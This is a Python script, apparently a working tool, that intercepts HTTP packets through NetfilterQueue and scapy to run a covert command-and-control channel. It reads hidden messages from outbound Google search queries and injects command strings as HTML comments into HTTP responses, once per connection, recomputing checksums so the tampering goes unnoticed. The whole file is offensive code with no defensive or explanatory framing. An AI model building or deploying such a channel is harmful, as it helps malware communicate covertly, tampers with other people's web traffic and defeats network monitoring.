from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw
import re

TARGET_HOST = b"www.google.com"
COVERT_CMD = "pong!"

# Track injected streams
injected_streams = set()

def inject_command(payload, command):
    try:
        html = payload.decode(errors="ignore")
        if "</body>" in html:
            html = html.replace("</body>", f"<!-- C2CMD:{command} --></body>")
        return html.encode()
    except Exception:
        return payload

def extract_covert_message(payload):
    try:
        data = payload.decode(errors="ignore")
        # Match: GET /search?q=What+is+<message>+? HTTP/1.1
        match = re.search(r"GET /search\?q=What\+is\+([^\+]+)\+\?", data)
        if match:
            covert_message = match.group(1)
            print(f"[+] Covert message received: {covert_message}", flush=True)
    except Exception:
        pass

def process_packet(pkt):
    scapy_pkt = IP(pkt.get_payload())

    if scapy_pkt.haslayer(TCP):
        tcp = scapy_pkt[TCP]
        stream_id = (scapy_pkt[IP].src, tcp.sport, scapy_pkt[IP].dst, tcp.dport)

        # Reset injection state on connection close
        if tcp.flags & 0x01 or tcp.flags & 0x04:  # FIN or RST
            if stream_id in injected_streams:
                print(f"[*] Connection closed, resetting state for {stream_id}", flush=True)
                injected_streams.discard(stream_id)

        # Handle data packets
        if scapy_pkt.haslayer(Raw):
            raw_load = scapy_pkt[Raw].load

            # Outbound HTTP request: extract covert message
            if tcp.dport == 80 and TARGET_HOST in raw_load:
                extract_covert_message(raw_load)

            
            if tcp.sport == 80:
                print(f"[DEBUG] HTTP response packet size: {len(raw_load)}", flush=True)
            if b"</body>" in raw_load:
                print("[DEBUG] Found </body> marker!", flush=True)

            
            # Inbound HTTP response: inject only once per TCP stream
            if tcp.sport == 80 and stream_id not in injected_streams:
                if b"</body>" in raw_load:
                    print("[+] Injecting Code into Body (first packet only)", flush=True)
                    new_payload = inject_command(raw_load, COVERT_CMD)
                    scapy_pkt[Raw].load = new_payload
                    del scapy_pkt[IP].len
                    del scapy_pkt[IP].chksum
                    del scapy_pkt[TCP].chksum
                    pkt.set_payload(bytes(scapy_pkt))
                    injected_streams.add(stream_id)

    pkt.accept()

if __name__ == "__main__":
    print("[+] NFQUEUE covert channel proxy running (silent mode)", flush=True)
    nfqueue = NetfilterQueue()
    nfqueue.bind(1, process_packet)
    nfqueue.run()


